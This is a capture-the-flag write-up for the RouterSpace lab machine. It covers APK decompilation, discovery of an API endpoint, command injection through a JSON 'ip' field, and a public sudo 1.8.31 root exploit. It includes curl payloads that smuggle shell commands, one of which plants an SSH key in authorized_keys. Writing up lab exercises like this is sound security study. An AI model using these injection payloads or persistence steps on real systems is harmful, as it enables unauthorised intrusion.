---
description: >-
  In my opinion, one of the most annoying machines just to set up and the
  exploits required are quite disappointing.
---

# RouterSpace

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.227.47 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-06 10:32 EDT
Nmap scan report for 10.129.227.47
Host is up (0.017s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### RouterSpace App

Port 80 reveals a page advertising an application:

<figure><img src="../../../.gitbook/assets/image (858).png" alt=""><figcaption></figcaption></figure>

The intended method is to do dynamic analysis of the machine and run the application in an emulator (which is annoying because `anbox` is not as easy to install anymore and `genymotion` doesn't seem to work with my machine).

Instead, I will be doing static analysis to solve it. First, we need to decompile it with `apktool`.

```
$ apktool d RouterSpace.apk 
$ cd RouterSpace
$ ls
AndroidManifest.xml  apktool.yml  assets  kotlin  lib  original  res  smali  unknown
```

With in the `assets` file, there's an `index.android.bundle` file. This file contains all the JS code used in the entire application, so it's really long but probably has the information I need within it.

Within it, there's this function:

{% code overflow="wrap" %}
```javascript
function _0x31d2() {
    var _0x379495 = ['EwCVL', 'ugPGw', 'Router is ', '-Bold', 'data', '30158095HXLvSs', 'post', 'eAgent', 'http://rou', '10BrHGoD', 'gray', '80%', 'applicatio', 'white', 'ck your in', 'ternet con', 'tb/api/v4/', 'Please pro', 'Image', 'XvhFJ', '2111347AIyazK', 'v/check/de', 'vide an IP', 'working fi', 'DKyDg', 'YnNsf', 'tzoEq', 'EKNxl', 'the server', 'log', 'ne!.', 'NunitoSans', 'OgZoU', 'TouchableO', '32457sfggQZ', 'nection.', '[ RESPOND ', 'center', 'createElem', '__esModule', 'per', 'mGNnc', 'then', 'catch', 'contain', 'uAiCt', 'bottom', '42740dmWhFN', 'Text', 'ButtonWrap', 'OLDvc', 'Sorry !', 'terspace.h', 'n/json', 'StyleSheet', '/router/de', 'darkgray', 'JHvFI', 'transparen', 'UWIVj', 'Please che', 'SZqEq', 'default', 'HrHYj', 'Hey !', 'monitoring', 'StatusBar', 'error', '1013605BwxVJG', '[ DEBUG ] ', 'defineProp', 'gUnlE', 'Unable to ', '25%', 'pacity', 'ButtonText', 'gKQYs', '1006000MsdmAT', 'handleSubm', 'PpdRl', 'shxxV', 'ent', 'View', 'erty', 'show', 'Formik', 'Check Stat', '0.0.0.0', '128BJBUSC', '6BAxhAU', '4584186MTHGwP', 'connet to ', 'vESlr', 'GHjuW', ' Address.', 'container', 'create', 'RouterSpac', 'viceAccess', '72dIvHGU', 'info'];
    _0x31d2 = function () {
        return _0x379495;
    };
    return _0x31d2();
}
```
{% endcode %}

This looks like a request, and it is to `http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess`. This means that we can probably access the application from the website. We can see `n/json`, which means they are probably sending JSON POST requests. We also see `0.0.0.0`, which is looks like an IP address.&#x20;

{% code overflow="wrap" %}
```bash
$ curl -X POST http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -H "User-Agent: RouterSpaceAgent" -d '{"ip":"127.0.0.1"}'
"127.0.0.1\n"
```
{% endcode %}

We can test for RCE or injection, and find that RCE works.&#x20;

{% code overflow="wrap" %}
```bash
$ curl -X POST http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -H "User-Agent: RouterSpaceAgent" -d '{"ip":"127.0.0.1;id"}'
"127.0.0.1\nuid=1001(paul) gid=1001(paul) groups=1001(paul)\n"
```
{% endcode %}

We can get a reverse shell from or we can put our public key into the `authorized_keys` file.&#x20;

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>$ curl -X POST http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -H "User-Agent: RouterSpaceAgent" -d '{"ip":"127.0.0.1; echo ssh-rsa KEY kali@kali > /home/paul/.ssh/authorized_keys"}'
</strong>"127.0.0.1\n"
</code></pre>

Then, we can `ssh` in as `paul`.&#x20;

## Privilege Escalation

### Sudo Exploit

This machine is running an outdated version of `sudo`.&#x20;

```
paul@routerspace:~$ sudo --version
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```

We can use this repository to exploit it:

{% embed url="https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit" %}

Transfer the files over `scp`.&#x20;

```
$ scp * paul@routerspace.htb:~
```

Then, `make` and run it to get a root shell.

<figure><img src="../../../.gitbook/assets/image (1680).png" alt=""><figcaption></figcaption></figure>
